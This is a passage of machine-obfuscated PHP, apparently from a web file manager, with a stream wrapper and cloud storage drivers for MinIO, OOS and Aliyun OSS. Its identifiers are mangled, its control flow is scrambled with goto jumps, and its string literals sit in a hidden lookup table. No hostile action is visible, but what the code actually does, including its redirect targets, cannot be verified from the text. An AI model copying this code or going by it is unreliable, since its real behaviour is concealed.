$C°±ƒÓÎõß[$B­ãÅâ×Á[77]] > 1024 * 1024 * 10) { return !1; } goto fó„Êôãİ®; fó„Êôãİ®: if ($DÊ÷ÎŸÏÑì === -1) { $DÊ÷ÎŸÏÑì = $C°±ƒÓÎõß[$B­ãÅâ×Á[77]]; } if ($DÊ÷ÎŸÏÑì == 0) { return $B­ãÅâ×Á[33]; } $a¹ºâ–½‡ù = array($B­ãÅâ×Á[1297] . $FöšƒöŒóÈ . $B­ãÅâ×Á[730] . ($FöšƒöŒóÈ + $DÊ÷ÎŸÏÑì - 1)); goto C£¹¡±ê¤—; C£¹¡±ê¤—: $EÊ½ÃÓåá = url_request($DÑ­²ÀáÑ´, $B­ãÅâ×Á[216], !1, $a¹ºâ–½‡ù, !1, !1, 1); return $EÊ½ÃÓåá[$B­ãÅâ×Á[1043]] ? $EÊ½ÃÓåá[$B­ãÅâ×Á[1043]] : $B­ãÅâ×Á[33]; goto A»çôãƒ®Ş; A»çôãƒ®Ş: } public function download($dÂÌÄòÖ¼¾, $bŠáˆØ²…¹) { Downloader::start($dÂÌÄòÖ¼¾, $bŠáˆØ²…¹); return $bŠáˆØ²…¹; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($fÅæä¾¥íé, $c®¿´Ôáƒ  = '') { goto B½Ÿğòçí‚; DàÁ¼ÄÑ½‚: return $this->info ? !0 : !1; goto c¦å²™ï¼; FŒ´¾éÄ¶: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$fÅæä¾¥íé])) { self::$_chunkBuffer[$fÅæä¾¥íé] = array(); } goto DàÁ¼ÄÑ½‚; B½Ÿğòçí‚: $this->info = $this->info($fÅæä¾¥íé); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¯Ò¬Èè][75]]; goto FŒ´¾éÄ¶; c¦å²™ï¼: } function stream_read($aŒÜÌ Ã…¿) { $f†ë²Šª¤å = $this->fileSubstr($this->pose, $aŒÜÌ Ã…¿); $this->pose += strlen($f†ë²Šª¤å); return $f†ë²Šª¤å; } public function stream_tell() { return $this->pose; } public function stream_seek($D÷ù´’¦Ÿ†, $CÊ²“ŞÓƒŠ) { $DŠ­×ÏÙÓ =& $_SERVER[¯Ò¬Èè]; if ($CÊ²“ŞÓƒŠ == SEEK_SET) { $this->pose = $D÷ù´’¦Ÿ†; } else { if ($CÊ²“ŞÓƒŠ == SEEK_CUR) { $this->pose += $D÷ù´’¦Ÿ†; } else { if ($CÊ²“ŞÓƒŠ == SEEK_END) { $this->pose = $this->info[$DŠ­×ÏÙÓ[77]] + intval($D÷ù´’¦Ÿ†); } } } if ($D÷ù´’¦Ÿ† < 0) { $this->pose = $this->info[$DŠ­×ÏÙÓ[77]] + $D÷ù´’¦Ÿ†; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¯Ò¬Èè][77]]; } public function stream_close() { return !0; } public function url_stat($d›¨ã¢ãäõ, $e¤ì©Äªˆ¸) { $Bİ’Ù·­‹ò =& $_SERVER[¯Ò¬Èè]; $FÅäÔ–™š = $this->info($d›¨ã¢ãäõ); return array($Bİ’Ù·­‹ò[1298] => 0, $Bİ’Ù·­‹ò[1299] => 0, $Bİ’Ù·­‹ò[12] => 32768 + 511, $Bİ’Ù·­‹ò[1300] => 0, $Bİ’Ù·­‹ò[1301] => 0, $Bİ’Ù·­‹ò[1302] => 0, $Bİ’Ù·­‹ò[1303] => 0, $Bİ’Ù·­‹ò[77] => $FÅäÔ–™š[$Bİ’Ù·­‹ò[77]], $Bİ’Ù·­‹ò[1304] => $FÅäÔ–™š[$Bİ’Ù·­‹ò[1176]], $Bİ’Ù·­‹ò[1262] => $FÅäÔ–™š[$Bİ’Ù·­‹ò[107]], $Bİ’Ù·­‹ò[1261] => $FÅäÔ–™š[$Bİ’Ù·­‹ò[187]], $Bİ’Ù·­‹ò[1305] => 0, $Bİ’Ù·­‹ò[1306] => 0); } static $fileInfo = array(); public function info($bº¨ÈçÁò) { $cŸºÈ‰Ş¬° = $_SERVER[¯Ò¬Èè][1307]; if (isset(self::$fileInfo[$bº¨ÈçÁò])) { return self::$fileInfo[$bº¨ÈçÁò]; } if (substr($bº¨ÈçÁò, 0, strlen($cŸºÈ‰Ş¬°)) != $cŸºÈ‰Ş¬°) { return !1; } self::$fileInfo[$bº¨ÈçÁò] = IO::info(substr($bº¨ÈçÁò, strlen($cŸºÈ‰Ş¬°))); return self::$fileInfo[$bº¨ÈçÁò]; } public static function read($dšÑäÙØõà, $DÄÏÍ½¦´—, $cË’ã­ê‰Ê) { goto bÇÌ”ëó«¨; c•Ë¢Äğ¯§: return $Dµ¤‡ÖõÈ¸; goto AŞ‘Ù†¾ô‡; e‹ËÚŒÖ: $b’©Ø‰ó­° = 0; while ($b’©Ø‰ó­° < $cË’ã­ê‰Ê) { $bÒØƒ¥…Ñ® = min($a ¼ÃÅÆ•Ä, $cË’ã­ê‰Ê - $b’©Ø‰ó­°); $Dµ¤‡ÖõÈ¸ .= fread($aÌŒ‡ó›Ÿ, $bÒØƒ¥…Ñ®); $b’©Ø‰ó­° += $bÒØƒ¥…Ñ®; } fclose($aÌŒ‡ó›Ÿ); goto c•Ë¢Äğ¯§; e¡ÇšÉÑØ†: $a ¼ÃÅÆ•Ä = 8192; fseek($aÌŒ‡ó›Ÿ, $DÄÏÍ½¦´—, SEEK_SET); $Dµ¤‡ÖõÈ¸ = $cÔ¹¹ÜÛ‰ç[33]; goto e‹ËÚŒÖ; bÇÌ”ëó«¨: $cÔ¹¹ÜÛ‰ç =& $_SERVER[¯Ò¬Èè]; $aÌŒ‡ó›Ÿ = fopen($dšÑäÙØõà, $cÔ¹¹ÜÛ‰ç[1178]); if (!$aÌŒ‡ó›Ÿ) { return $cÔ¹¹ÜÛ‰ç[33]; } goto e¡ÇšÉÑØ†; AŞ‘Ù†¾ô‡: } public function fileSubstr($fÏÖ˜‰›‹, $Aå¿ÈåÜÌ) { goto eİô‚¨ŠĞë; eİô‚¨ŠĞë: $d»‰ÁŠâò× =& $_SERVER[¯Ò¬Èè]; $Ašˆ½İ” = $this->info[$d»‰ÁŠâò×[77]]; $a —Šáß = $fÏÖ˜‰›‹; goto a½Æ†›ÃÁ‰; fä°ŞóÙíÊ: ksort($FÒÒÚ‘¢Ü); $cŒï¤µ„å— = substr($Fˆé‰ğ½‘à, $fÏÖ˜‰›‹ - $FÜ‡Ù’½«¯, $Aå¿ÈåÜÌ); return $cŒï¤µ„å—; goto dÅîÏšƒË»; Dé„ïëôòÊ: $Eå³­–ƒ = ceil(($fÏÖ˜‰›‹ + $Aå¿ÈåÜÌ) / $B–¡ÑìùÏò) * $B–¡ÑìùÏò - $FÜ‡Ù’½«¯; $Fˆé‰ğ½‘à = IO::fileSubstr($this->path, $FÜ‡Ù’½«¯, $Eå³­–ƒ); $FÒÒÚ‘¢Ü[$FÜ‡Ù’½«¯ . $d»‰ÁŠâò×[33]] = $Fˆé‰ğ½‘à; goto fä°ŞóÙíÊ; aÌÛĞ«¢¤: if ($fÏÖ˜‰›‹ + $Aå¿ÈåÜÌ > $Ašˆ½İ”) { $Aå¿ÈåÜÌ = $Ašˆ½İ” - $fÏÖ˜‰›‹; } if ($Aå¿ÈåÜÌ <= 0) { return $d»‰ÁŠâò×[33]; } if ($fÏÖ˜‰›‹ < 0 || $fÏÖ˜‰›‹ >= $Ašˆ½İ” || $Aå¿ÈåÜÌ <= 0 || $Aå¿ÈåÜÌ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\154\145\x52\x65\x61\144\40\x65\x72\x72\x6f\x72\x21\40\163\164\141\162\164\75{$fÏÖ˜‰›‹}\73\154\145\x6e\x67\x74\x68\75{$Aå¿ÈåÜÌ}\x3b\40\x73\x69\172\145\75{$Ašˆ½İ”}\x3b"); } goto Cñ—ÜÖ„‹”; Cñ—ÜÖ„‹”: $B–¡ÑìùÏò = 64 * 1024; $FÒÒÚ‘¢Ü =& self::$_chunkBuffer[$this->path]; if (!$FÒÒÚ‘¢Ü) { $FÒÒÚ‘¢Ü = array(); } goto D´Ï†ìáÚá; a½Æ†›ÃÁ‰: $d¦‘­ê›àÎ = $Aå¿ÈåÜÌ; if ($fÏÖ˜‰›‹ < 0) { $fÏÖ˜‰›‹ = $Ašˆ½İ” + $fÏÖ˜‰›‹; } if ($Aå¿ÈåÜÌ === !1) { $Aå¿ÈåÜÌ = $Ašˆ½İ” - $fÏÖ˜‰›‹; } goto aÌÛĞ«¢¤; D´Ï†ìáÚá: $eÜ¢æêææ³ = 0; $dÃ¼Ô‡ªÖå = 0; $aõ„îàÃ½© = $d»‰ÁŠâò×[33]; goto eµ½òÄ©õ„; eµ½òÄ©õ„: foreach ($FÒÒÚ‘¢Ü as $eÜ¢æêææ³ => $aõ„îàÃ½©) { $eÜ¢æêææ³ = intval($eÜ¢æêææ³); $dÃ¼Ô‡ªÖå = $eÜ¢æêææ³ + strlen($aõ„îàÃ½©); if ($fÏÖ˜‰›‹ >= $dÃ¼Ô‡ªÖå) { continue; } if ($fÏÖ˜‰›‹ >= $eÜ¢æêææ³ && $fÏÖ˜‰›‹ + $Aå¿ÈåÜÌ <= $dÃ¼Ô‡ªÖå) { return substr($aõ„îàÃ½©, $fÏÖ˜‰›‹ - $eÜ¢æêææ³, $Aå¿ÈåÜÌ); } break; } if (count($FÒÒÚ‘¢Ü) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($d»‰ÁŠâò×[1308], $d»‰ÁŠâò×[1309] . count($FÒÒÚ‘¢Ü) . "\73\163\x74\x61\162\164\75{$fÏÖ˜‰›‹}\54\x6c\x65\x6e\147\164\150\75{$Aå¿ÈåÜÌ}\x3b\x70\157\x73\x65\x3a{$eÜ¢æêææ³}\x7e{$dÃ¼Ô‡ªÖå}"); throw new Exception($d»‰ÁŠâò×[1310]); } $FÜ‡Ù’½«¯ = intval($fÏÖ˜‰›‹ / $B–¡ÑìùÏò) * $B–¡ÑìùÏò; goto Dé„ïëôòÊ; dÅîÏšƒË»: } private function log($CåÅš‹±Šì, $e­–‰é‘¼) { $EÔàÁ×ÆÄÔ =& $_SERVER[¯Ò¬Èè]; $dğœ¡¡±è = timeFloat() - $this->timeStart; write_log(sprintf($EÔàÁ×ÆÄÔ[1311], $CåÅš‹±Šì, $this->info[$EÔàÁ×ÆÄÔ[28]], $dğœ¡¡±è, $e­–‰é‘¼), $EÔàÁ×ÆÄÔ[1227]); } } goto d§™£Ë´; b…¯ÆØ­¶: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($bó¿¬Á“ßù) { parent::__construct($bó¿¬Á“ßù); $this->signatureVersion($_SERVER[¯Ò¬Èè][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CøéÒæ’ Ñ) { parent::__construct($CøéÒæ’ Ñ); $this->signatureVersion($_SERVER[¯Ò¬Èè][200]); } public function fileOutLink($E÷’§Ü«¾) { $A›¤£‘®›™ =& $_SERVER[¯Ò¬Èè]; if (substr($E÷’§Ü«¾, 0, 7) == $A›¤£‘®›™[1124]) { $E÷’§Ü«¾ = $A›¤£‘®›™[1125] . substr($E÷’§Ü«¾, 7); } header($A›¤£‘®›™[156] . $E÷’§Ü«¾); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($eª‰ÁšËó´) { parent::__construct(); include_once SDK_DIR . $_SERVER[¯Ò¬Èè][1179]; $this->_init($eª‰ÁšËó´); } public function _init($EÉ…Ç¨Œíñ) { foreach ($EÉ…Ç¨Œíñ as $f®†óºó·È => $Bê§ˆ½¯ºÀ) { if (isset($this->{$f®†óºó·È})) { $this->{$f®†óºó·È} = $Bê§ˆ½¯ºÀ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¯Ò¬Èè][1180], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto fª®Ğİ°•µ; fª®Ğİ°•µ: $dÓ¸ó÷àƒä =& $_SERVER[¯Ò¬Èè]; $AÎªÍŸ ñ« = new OSS\Model\CorsConfig(); $BÉ¦ö…öøİ = new OSS\Model\CorsRule(); goto DßÂÕ—±Û¯; DßÂÕ—±Û¯: $BÉ¦ö…öøİ->addAllowedOrigin($dÓ¸ó÷àƒä[1181]); $BÉ¦ö…öøİ->addAllowedMethod($dÓ¸ó÷àƒä[1182]); $BÉ¦ö…öøİ->addAllowedMethod($dÓ¸ó÷àƒä[1183]); goto dø„…÷ºß˜; aéÃê´ƒÓ–: $AÎªÍŸ ñ«->addRule($BÉ¦ö…öøİ); try { $this->client->putBucketCors($this->bucket, $AÎªÍŸ ñ«); } catch (OSS\Core\OssException $bßÀÉ„«°‰) { return !1; } return !0; goto Cæ‘‰Š; dø„…÷ºß˜: $BÉ¦ö…öøİ->addAllowedMethod($dÓ¸ó÷àƒä[1184]); $BÉ¦ö…öøİ->addAllowedMethod($dÓ¸ó÷àƒä[1185]); $BÉ¦ö…öøİ->addAllowedMethod($dÓ¸ó÷àƒä[155]); goto EÅÁ³çªê¸; EÅÁ³çªê¸: $BÉ¦ö…öøİ->setMaxAgeSeconds(600); $BÉ¦ö…öøİ->addExposeHeader($dÓ¸ó÷àƒä[1186]); $BÉ¦ö…öøİ->addAllowedHeader($dÓ¸ó÷àƒä[1181]); goto aéÃê´ƒÓ–; Cæ‘‰Š: } public function getBucketCors() { goto Cñº§ôª¾É; b¼£·ÏÏªí: if (!$EÇŠ‚£âéŸ || !($c£È¾½÷Ú = $EÇŠ‚£âéŸ->getRules())) { return null; } $F›³„ù›ĞÉ = $c£È¾½÷Ú[0]->getAllowedOrigins(); $BÁÃÔÒï¥ì = $c£È¾½÷Ú[0]->getAllowedMethods(); goto AƒÍ“Æ¬±; Cñº§ôª¾É: $AÈâˆÄ²ôá =& $_SERVER[¯Ò¬Èè]; $EÇŠ‚£âéŸ = null; try { $EÇŠ‚£âéŸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $F²‹ƒæ¨¸ç) { return null; } goto b¼£·ÏÏªí; AƒÍ“Æ¬±: $B½šÎÕÕõš = $c£È¾½÷Ú[0]->getMaxAgeSeconds(); $B·ïßŞ„ó¬ = $c£È¾½÷Ú[0]->getExposeHeaders(); $AÆÛ£Çáá¶ = $c£È¾½÷Ú[0]->getAllowedHeaders(); goto aÖ«†‡îÁë; aÖ«†‡îÁë: return array($AÈâˆÄ²ôá[175] => isset($F›³„ù›ĞÉ[0]) ? $F›³„ù›ĞÉ[0] : $AÈâˆÄ²ôá[33], $AÈâˆÄ²ôá[179] => $BÁÃÔÒï¥ì, $AÈâˆÄ²ôá[1187] => $B½šÎÕÕõš, $AÈâˆÄ²ôá[1188] => isset($B·ïßŞ„ó¬[0]) ? $B·ïßŞ„ó¬[0] : $AÈâˆÄ²ôá[33], $AÈâˆÄ²ôá[177] => isset($AÆÛ£Çáá¶[0]) ? $AÆÛ£Çáá¶[0] : $AÈâˆÄ²ôá[33]); goto AŠå¤´ä‘‹; AŠå¤´ä‘‹: } public function isBucketCors() { goto DÉèæ×¦êÎ; c‚î¤ª×çÌ: $c³à‘¾„ˆ = array($eÉÑ²›ÊÜŞ[180], $eÉÑ²›ÊÜŞ[181], $eÉÑ²›ÊÜŞ[182], $eÉÑ²›ÊÜŞ[183], $eÉÑ²›ÊÜŞ[184]); $D¶¸“ĞïÑ‚ = array_diff($c³à‘¾„ˆ, $cºçìÇ¤à); return empty($D¶¸“ĞïÑ‚); goto c¸½ ó˜§; a„ê—Ñò›„: if ($CáÔê£¾ŒÎ[$eÉÑ²›ÊÜŞ[175]] != $eÉÑ²›ÊÜŞ[176] || $CáÔê£¾ŒÎ[$eÉÑ²›ÊÜŞ[177]] != $eÉÑ²›ÊÜŞ[176]) { return !1; } $cºçìÇ¤à = array_map($eÉÑ²›ÊÜŞ[178], $CáÔê£¾ŒÎ[$eÉÑ²›ÊÜŞ[179]]); if (!is_array($cºçìÇ¤à)) { $cºçìÇ¤à = array(); } goto c‚î¤ª×çÌ; DÉèæ×¦êÎ: $eÉÑ²›ÊÜŞ =& $_SERVER[¯Ò¬Èè]; $CáÔê£¾ŒÎ = $this->getBucketCors(); if (!$CáÔê£¾ŒÎ || !is_array($CáÔê£¾ŒÎ)) { return !1; } goto a„ê—Ñò›„; c¸½ ó˜§: } public function mkfile($FƒĞ»®ğ°, $F¿İ£¡Àßš = '', $cÉœ‰×óµÇ = REPEAT_RENAME) { $B¹ç½³´“Å = $this->setContent($FƒĞ»®ğ°, $F¿İ£¡Àßš); if ($B¹ç½³´“Å !== !1) { return $this->getPathOuter($FƒĞ»®ğ°); } return !1; } public function mkdir($BˆÂ‰È¡Û‚, $AôŠšÂ„Áã = REPEAT_SKIP) { if ($this->_isFolder($BˆÂ‰È¡Û‚)) { return $this->getPathOuter($BˆÂ‰È¡Û‚); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($BˆÂ‰È¡Û‚)); } catch (OSS\Core\OssException $bÃ•ñ¢»‘‚) { return !1; } return $this->getPathOuter($BˆÂ‰È¡Û‚); } private function fileList($c‹ƒ«¸ï–, $c…¿±‹¯Ô´ = '', $d©£‚‘ß°¼ = 0) { goto bÛ·Ö¤œÔ…; d”»½İŠÃõ: $d’¤ù£ˆÑ¥ = $DáôÓÒÜ[33]; $aˆÑ‘¢Ú½‹ = 1000; $bò»ó–œ¦» = $cÏçîµ¯÷¦ = array(); goto eí‰ê”˜¸ß; eí‰ê”˜¸ß: while (!0) { $eñ§’ˆèÉ = array($DáôÓÒÜ[1189] => $c…¿±‹¯Ô´, $DáôÓÒÜ[186] => $fˆç”³†ø, $DáôÓÒÜ[1190] => $aˆÑ‘¢Ú½‹, $DáôÓÒÜ[1191] => $d’¤ù£ˆÑ¥); try { $F¡ÉŒø£® = $this->client->listObjects($this->bucket, $eñ§’ˆèÉ); } catch (OSS\Core\OssException $e£„Ş™ƒ•) { break; } $d’¤ù£ˆÑ¥ = $F¡ÉŒø£®->getNextMarker(); $eĞÔ³ğ‡ = $F¡ÉŒø£®->getObjectList(); $BİÁ«âËÓ = $F¡ÉŒø£®->getPrefixList(); foreach ($eĞÔ³ğ‡ as $FÂá”õ‰) { if ($FÂá”õ‰->getKey() == $fˆç”³†ø) { continue; } $fÖï»İ’¦µ = $FÂá”õ‰->getKey(); if ($d©£‚‘ß°¼) { $fÖï»İ’¦µ = array($DáôÓÒÜ[28] => $fÖï»İ’¦µ, $DáôÓÒÜ[77] => $FÂá”õ‰->getSize(), $DáôÓÒÜ[190] => strtotime($FÂá”õ‰->getLastModified())); } $cÏçîµ¯÷¦[] = $fÖï»İ’¦µ; } foreach ($BİÁ«âËÓ as $d‚¿áÌë«Œ) { $bò»ó–œ¦»[] = $d‚¿áÌë«Œ->getPrefix(); } if ($d’¤ù£ˆÑ¥ === $DáôÓÒÜ[33]) { break; } } return array($DáôÓÒÜ[74] => $bò»ó–œ¦», $DáôÓÒÜ[73] => $cÏçîµ¯÷¦); goto B‡¦çîÛŞƒ; bÛ·Ö¤œÔ…: $DáôÓÒÜ =& $_SERVER[¯Ò¬Èè]; $c‹ƒ«¸ï– = trim($c‹ƒ«¸ï–, $DáôÓÒÜ[8]); $fˆç”³†ø = empty($c‹ƒ«¸ï–) ? $DáôÓÒÜ[33] : $c‹ƒ«¸ï– . $DáôÓÒÜ[8]; goto d”»½İŠÃõ; B‡¦çîÛŞƒ: } public function copyFile($CŒ¯³Ğ†Ï½, $e¶Ã¹İå¡‘) { $fË‰è­ãÏŒ = $this->size($CŒ¯³Ğ†Ï½); if ($fË‰è­ãÏŒ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CŒ¯³Ğ†Ï½, $this->bucket, $this->pathEncode($e¶Ã¹İå¡‘)); } catch (OSS\Core\OssException $b®Ïä«ÔØ’) { return !1; } return $this->getPathOuter($e¶Ã¹İå¡‘); } $A·¸ê›±Å = $this->multiCopyObject($CŒ¯³Ğ†Ï½, $e¶Ã¹İå¡‘, $fË‰è­ãÏŒ); return $A·¸ê›±Å ? $this->getPathOuter($e¶Ã¹İå¡‘) : !1; } private function multiCopyObject($b¿¿é™¤ô, $EÀè¶À·†, $f¨†¼‡ºåÄ) { $fè¹®Íïª‘ =& $_SERVER[¯Ò¬Èè]; try { goto C•…·º™¿; a’© ¸Ïğ: $Cäå ”œâƒ = 1024 * 1024 * 10; $f…éÚ¿ëš = $this->client->generateMultiuploadParts($f¨†¼‡ºåÄ, $Cäå ”œâƒ); foreach ($f…éÚ¿ëš as $DóŞíõîÎ => $FÃİšğ¸šÛ) { $Fè‹“¯É = $eÑµ‹¾ŠÁá + (int) $FÃİšğ¸šÛ[$fè¹®Íïª‘[1193]]; $FÚ±¢…™¿“ = (int) $FÃİšğ¸šÛ[$fè¹®Íïª‘[325]] + $Fè‹“¯É - 1; $A´†•Š‰¦ = array($fè¹®Íïª‘[1194] => $Fè‹“¯É, $fè¹®Íïª‘[1195] => $FÚ±¢…™¿“); $C·àÎÔÊ±‡[] = $this->client->uploadPartCopy($this->bucket, $b¿¿é™¤ô, $this->bucket, $this->pathEncode($EÀè¶À·†), $Bò­ ğİ´, $BÔÌœ–­‡Î, $A´†•Š‰¦); $Bò­ ğİ´ = $Bò­ ğİ´ + 1; } goto a¥…®ŠÂ; a¥…®ŠÂ: $b£áŠèâ· = array(); foreach ($C·àÎÔÊ±‡ as $DóŞíõîÎ => $d‹¬ˆØœí ) { $b£áŠèâ·[] = array($fè¹®Íïª‘[1196] => $DóŞíõîÎ + 1, $fè¹®Íïª‘[1197] => $d‹¬ˆØœí ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($EÀè¶À·†), $BÔÌœ–­‡Î, $b£áŠèâ·); goto FË¬¡åŠã¦; Aì°íÑÇä†: $Bò­ ğİ´ = 1; $eÑµ‹¾ŠÁá = 0; $C·àÎÔÊ±‡ = array(); goto a’© ¸Ïğ; C•…·º™¿: $c ‘ÇÈÁ¹‡ = array(); if ($dê¾ß™ïÛÈ = $this->hashMd5($b¿¿é™¤ô)) { $c ‘ÇÈÁ¹‡ = array(OSS\OssClient::OSS_HEADERS => array($fè¹®Íïª‘[1192] => $dê¾ß™ïÛÈ)); } $BÔÌœ–­‡Î = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EÀè¶À·†), $c ‘ÇÈÁ¹‡); goto Aì°íÑÇä†; FË¬¡åŠã¦: } catch (OSS\Core\OssException $DãÀ¤è¢µË) { return !1; } return !0; } public function moveFile($Dø‘å¨Ø, $EÙ›âãºÆ) { if ($this->copyFile($Dø‘å¨Ø, $EÙ›âãºÆ)) { $this->remove($Dø‘å¨Ø); return $this->getPathOuter($EÙ›âãºÆ); } return !1; } public function delFile($fŠàÄÑƒ¹„) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fŠàÄÑƒ¹„)); } catch (OSS\Core\OssException $Aî‹¯»Ê‘) { return !1; } return !0; } public function delFolder($E¿Ò²ô•Š) { $aÙ”Ñä„ğ =& $_SERVER[¯Ò¬Èè]; $bĞ¸ù…ëÏ  = $this->fileList($E¿Ò²ô•Š); if (!empty($E¿Ò²ô•Š) && !in_array(trim($E¿Ò²ô•Š, $aÙ”Ñä„ğ[8]) . $aÙ”Ñä„ğ[8], $bĞ¸ù…ëÏ [$aÙ”Ñä„ğ[73]])) { $bĞ¸ù…ëÏ [$aÙ”Ñä„ğ[73]][] = trim($E¿Ò²ô•Š, $aÙ”Ñä„ğ[8]) . $aÙ”Ñä„ğ[8]; } foreach (array_chunk($bĞ¸ù…ëÏ [$aÙ”Ñä„ğ[73]], 1000) as $fÎò Šî¿‡) { try { $this->client->deleteObjects($this->bucket, $fÎò Šî¿‡); } catch (OSS\Core\OssException $A¼È•ÏßŒ) { continue; } } return !0; } public function rename($Dã‹¨©”¨, $EâÏÍË™öè) { return $this->renameObject($Dã‹¨©”¨, $EâÏÍË™öè); } private function fileInfo($F‘…¥”Œ, $AÀÆâ‰±Ğô = array()) { goto Dš‚‘‰Æ¤æ; Eò“Ë¸ó×©: if (isset($AÀÆâ‰±Ğô[$cëÏƒİç¤[77]])) { $f—–‰÷ÈøÇ[$cëÏƒİç¤[77]] = $AÀÆâ‰±Ğô[$cëÏƒİç¤[77]]; } if (isset($AÀÆâ‰±Ğô[$cëÏƒİç¤[107]])) { $f—–‰÷ÈøÇ[$cëÏƒİç¤[107]] = $AÀÆâ‰±Ğô[$cëÏƒİç¤[107]]; } if (isset($AÀÆâ‰±Ğô[$cëÏƒİç¤[190]]) && !trim($f—–‰÷ÈøÇ[$cëÏƒİç¤[107]])) { $f—–‰÷ÈøÇ[$cëÏƒİç¤[107]] = $AÀÆâ‰±Ğô[$cëÏƒİç¤[190]]; } goto Cí‹öŸô; Dš‚‘‰Æ¤æ: $cëÏƒİç¤ =& $_SERVER[¯Ò¬Èè]; $f—–‰÷ÈøÇ = array($cëÏƒİç¤[28] => $this->pathThis($F‘…¥”Œ), $cëÏƒİç¤[75] => $this->getPathOuter($F‘…¥”Œ), $cëÏƒİç¤[29] => $cëÏƒİç¤[167], $cëÏƒİç¤[187] => 0, $cëÏƒİç¤[107] => 0, $cëÏƒİç¤[77] => 0, $cëÏƒİç¤[160] => $this->ext($F‘…¥”Œ), $cëÏƒİç¤[188] => !0, $cëÏƒİç¤[189] => !0); if (empty($AÀÆâ‰±Ğô)) { $bˆ‰ÕÙÆÆ = $this->objectMeta($F‘…¥”Œ); if (!$bˆ‰ÕÙÆÆ) { return $f—–‰÷ÈøÇ; } $AÀÆâ‰±Ğô = array($cëÏƒİç¤[107] => strtotime($bˆ‰ÕÙÆÆ[$cëÏƒİç¤[1198]]), $cëÏƒİç¤[77] => $bˆ‰ÕÙÆÆ[$cëÏƒİç¤[1199]] + 0); } goto Eò“Ë¸ó×©; Cí‹öŸô: return $f—–‰÷ÈøÇ; goto fÜ‘ä«¥Òñ; fÜ‘ä«¥Òñ: } private function folderInfo($d­ƒö¦ºöĞ, $CÕ÷éß£—µ = array()) { $FËìêÙ¼† =& $_SERVER[¯Ò¬Èè]; $Bà¤ò¤¿Ø“ = array($FËìêÙ¼†[28] => $this->pathThis($d­ƒö¦ºöĞ), $FËìêÙ¼†[75] => $this->getPathOuter($FËìêÙ¼†[8] . $d­ƒö¦ºöĞ), $FËìêÙ¼†[29] => $FËìêÙ¼†[76], $FËìêÙ¼†[187] => 0, $FËìêÙ¼†[107] => 0, $FËìêÙ¼†[188] => !0, $FËìêÙ¼†[189] => !0); if (empty($CÕ÷éß£—µ)) { $d­ƒö¦ºöĞ = rtrim($d­ƒö¦ºöĞ, $FËìêÙ¼†[8]) . $FËìêÙ¼†[8]; $eØ„êË„ò = $this->objectMeta($d­ƒö¦ºöĞ); if (!$eØ„êË„ò) { return $Bà¤ò¤¿Ø“; } $CÕ÷éß£—µ = array($FËìêÙ¼†[187] => $eØ„êË„ò[$FËìêÙ¼†[1200]][$FËìêÙ¼†[1201]], $FËìêÙ¼†[107] => strtotime($eØ„êË„ò[$FËìêÙ¼†[1198]])); } if (isset($CÕ÷éß£—µ[$FËìêÙ¼†[107]])) { $Bà¤ò¤¿Ø“[$FËìêÙ¼†[107]] = $CÕ÷éß£—µ[$FËìêÙ¼†[107]]; } if (isset($CÕ÷éß£—µ[$FËìêÙ¼†[187]])) { $Bà¤ò¤¿Ø“[$FËìêÙ¼†[187]] = $CÕ÷éß£—µ[$FËìêÙ¼†[187]]; } return $Bà¤ò¤¿Ø“; } public function listPath($Cì™ †Ö†ª, $F‡èˆèÎ = false) { $a°åŠ¾ Å =& $_SERVER[¯Ò¬Èè]; $cŸÂ¿ÄÎ‹“ = $this->fileList($Cì™ †Ö†ª, $a°åŠ¾ Å[8], !0); foreach ($cŸÂ¿ÄÎ‹“[$a°åŠ¾ Å[74]] as $AÀ“Æ‘³‡“ => $c§‹îï‚Á) { $cŸÂ¿ÄÎ‹“[$a°åŠ¾ Å[74]][$AÀ“Æ‘³‡“] = $this->folderInfo($c§‹îï‚Á, $c§‹îï‚Á); } foreach ($cŸÂ¿ÄÎ‹“[$a°åŠ¾ Å[73]] as $AÀ“Æ‘³‡“ => $c§‹îï‚Á) { $cŸÂ¿ÄÎ‹“[$a°åŠ¾ Å[73]][$AÀ“Æ‘³‡“] = $this->fileInfo($c§‹îï‚Á[$a°åŠ¾ Å[28]], $c§‹îï‚Á); } return $cŸÂ¿ÄÎ‹“; } public function has($BÌ™ßöÛØ, $fêğ±™Ñ£® = false, $bÔÔ­•¿ = true) { goto Fªô Ÿƒ‚; cÊò¹…™×²: return !1; goto e©·¯ÊŸ˜Ì; A²¿¾ÚŠÛÛ: $b·òÕ„›ïˆ = $d¶äÁ™¬Ñø[33]; $B‰¸æ‡‰«“ = 500; $F¨‘Åğá­ç = 0; goto e‰â•¿±–; e‰â•¿±–: $a¾ñÓ±œÓ = 0; while (!0) { $d¥ğ¼ñ‰É‘ = array($d¶äÁ™¬Ñø[1189] => $d¶äÁ™¬Ñø[8], $d¶äÁ™¬Ñø[186] => $A¹…¬Úç«ì, $d¶äÁ™¬Ñø[1190] => $B‰¸æ‡‰«“, $d¶äÁ™¬Ñø[1191] => $b·òÕ„›ïˆ); try { $aÂ»ÅÅàäù = 